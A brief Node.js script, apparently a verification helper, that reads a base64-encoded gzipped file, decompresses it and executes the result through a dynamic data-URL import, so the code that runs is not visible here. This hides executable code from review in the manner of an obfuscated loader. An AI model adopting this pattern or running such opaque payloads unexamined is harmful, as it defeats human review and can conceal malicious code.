#!/usr/bin/env node
import {readFile} from 'node:fs/promises';
import {gunzipSync} from 'node:zlib';
const payload=new URL('./verify-v37-final-touch.mjs.gz.b64',import.meta.url);
const source=gunzipSync(Buffer.from((await readFile(payload,'utf8')).trim(),'base64')).toString('utf8');
await import(`data:text/javascript;base64,${Buffer.from(source).toString('base64')}`);
